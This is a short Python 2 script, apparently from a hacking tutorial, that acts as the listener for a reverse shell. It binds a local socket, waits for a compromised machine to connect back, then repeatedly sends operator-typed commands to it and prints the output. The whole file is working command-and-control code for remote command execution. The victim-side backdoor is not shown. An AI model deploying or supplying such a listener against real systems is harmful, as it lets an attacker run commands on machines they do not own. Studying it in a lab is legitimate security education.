#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/28/2018

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
listener.bind(("127.0.0.1",2508))
listener.listen(0)
print "[+] Waiting for incoming connection"
connection,address = listener.accept()
print "[+] Got a connection from " + str(address)
result = connection.recv(1024)
print result
while True:
    cmd = raw_input(">> ")
    if not cmd:
        continue
    connection.send(cmd)
    result = connection.recv(1024)
    print result
